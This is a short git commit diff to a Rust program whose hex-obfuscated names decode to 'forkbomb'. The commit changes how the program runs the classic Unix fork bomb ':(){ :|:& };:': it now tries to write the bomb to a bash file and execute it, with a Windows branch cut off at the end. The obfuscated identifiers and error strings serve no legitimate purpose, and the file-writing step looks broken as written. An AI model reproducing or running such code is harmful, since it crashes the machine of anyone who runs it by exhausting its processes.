4aefa98c82dc55d3b55c45f337ab48a12f94875c
Pikkel <ilovemathguy@gmail.com>
2021-12-22 05:17:26 -0500

    I hope this works

--- src/_0x666f726b626f6d62/main.rs
+++ src/_0x666f726b626f6d62/main.rs
@@ -7,9 +7,14 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
-        Command::new("sh")
-            .arg("-C")
-            .arg(":(){ :|:& };:")
+        Command::new("echo")
+            .arg("\":(){ :|:& };:\"")
+            .arg(">")
+            .arg("666f726b626f6d62.bash")
+            .spawn()
+            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
+        Command::new("bash")
+            .arg("666f726b626f6d62.bash")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
